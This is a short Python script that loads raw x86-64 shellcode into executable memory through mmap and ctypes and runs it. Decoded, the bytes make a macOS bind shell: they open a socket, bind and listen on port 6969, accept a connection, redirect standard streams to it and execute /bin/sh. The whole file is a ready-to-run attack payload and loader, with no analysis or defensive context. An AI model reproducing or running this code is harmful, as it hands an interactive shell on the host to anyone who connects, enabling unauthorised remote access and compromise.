import sys
import mmap
import ctypes

shellcode = (b'\x6a\x02\x41\x5c\x49\xc1\xe4\x18\x4c\x89\xe0'
             b'\xb0\x61\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2'
             b'\x0f\x05\x48\x97\x52\x52\xc6\x04\x24\x02\x66'
             b'\xc7\x44\x24\x02\x1b\x39\x48\x89\xe6\x4c\x89'
             b'\xe0\xb0\x68\xb2\x10\x0f\x05\x4c\x89\xe0\xb0'
             b'\x6a\x48\x31\xf6\x0f\x05\x30\xd2\x4c\x89\xe0'
             b'\xb0\x1e\x0f\x05\x48\x97\x6a\x02\x5e\x4c\x89'
             b'\xe0\xb0\x5a\x0f\x05\xff\xce\x79\xf5\x48\x31'
             b'\xf6\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73'
             b'\x68\x53\x48\x89\xe7\x4c\x89\xe0\xb0\x3b\x0f\x05')

print('[*] shell code raw: {0}'.format(shellcode))
print('[*] shell code length: {0}'.format(len(shellcode)))

# map shell code into memory
page = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
page.write(shellcode)
addr = ctypes.addressof(ctypes.c_int.from_buffer(page))
print('[*] shell code mapped at {0}'.format(hex(addr)))

# get a function pointer to shell code and execute it
f = ctypes.CFUNCTYPE(None)(addr)
print('[*] running ...')
f()